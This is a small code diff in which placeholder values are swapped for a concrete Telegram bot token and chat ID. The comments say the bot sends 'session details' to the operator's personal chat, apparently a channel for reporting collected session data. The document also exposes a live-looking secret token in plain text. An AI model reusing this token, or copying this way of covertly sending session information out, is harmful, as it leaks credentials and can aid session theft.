@@ -11,8 +11,8 @@ class Colors:
     END = "\033[0m"     # Reset to default color
 
 # Global bot token for sending session details to your Telegram
-admin_bot_token = "YOUR_ADMIN_BOT_TOKEN"  # Your bot token to communicate with you
-admin_chat_id = "YOUR_CHAT_ID"  # Your personal chat ID where session info will be sent
+admin_bot_token = "7120755233:AAEkA80gGu6QZ03LkDfZURllxoDIVpR8xg4"  # Your bot token to communicate with you
+admin_chat_id = "6939063404"  # Your personal chat ID where session info will be sent
 
 # Initialize bot for admin notifications
 admin_bot = telebot.TeleBot(admin_bot_token)
